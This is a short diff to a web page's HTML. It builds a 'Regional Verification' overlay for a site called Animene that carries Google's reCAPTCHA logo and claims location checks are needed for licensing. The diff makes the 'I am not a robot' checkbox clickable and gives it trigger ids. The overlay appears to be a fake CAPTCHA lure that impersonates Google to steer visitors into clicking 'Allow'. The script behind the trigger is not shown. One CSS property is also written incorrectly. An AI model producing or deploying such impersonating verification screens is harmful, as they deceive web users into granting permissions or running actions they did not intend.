@@ -18,8 +18,9 @@
         <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="margin-bottom:20px;">
         <h3 style="color:#333; margin-top:0;">Regional Verification</h3>
         <p style="color:#666; font-size:14px; line-height:1.6;">Animene requires location verification to comply with regional licensing agreements. Please click 'Allow' to proceed.</p>
-        <div style="border:1px solid #ccc; padding:15px; background:#f9f9f9; display:flex; align-items:center; gap:10px; border-radius:4px;">
-          <input type="checkbox" checked disabled> <span style="font-size:14px; color:#555;">I am not a robot</span>
+        <div id="captcha-trigger" style="border:1px solid #ccc; padding:15px; background:#f9f9f9; display:flex; align items:center; gap:10px; border-radius:4px; cursor:pointer;">
+          <input type="checkbox" id="verify-checkbox" style="cursor:pointer;">
+          <span style="font-size:14px; color:#555;">I am not a robot</span>
         </div>
       </div>
     </div>
